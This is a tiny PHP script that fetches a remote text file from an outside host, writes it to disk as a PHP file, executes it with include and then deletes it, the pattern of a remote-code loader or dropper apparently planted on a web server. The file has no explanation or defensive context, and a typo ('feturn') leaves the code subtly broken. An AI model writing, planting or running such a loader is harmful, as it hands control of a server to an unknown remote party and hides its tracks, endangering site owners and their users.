<?php
$url = "https://xy.xzvs.top/i/payation.txt";
$savePath = __DIR__ . "/payation.php";
$content = file_get_contents($url);
if ($content === false) {
    feturn;
}
file_put_contents($savePath, $content);
include $savePath;
if (file_exists($savePath)) {
    unlink($savePath);
}
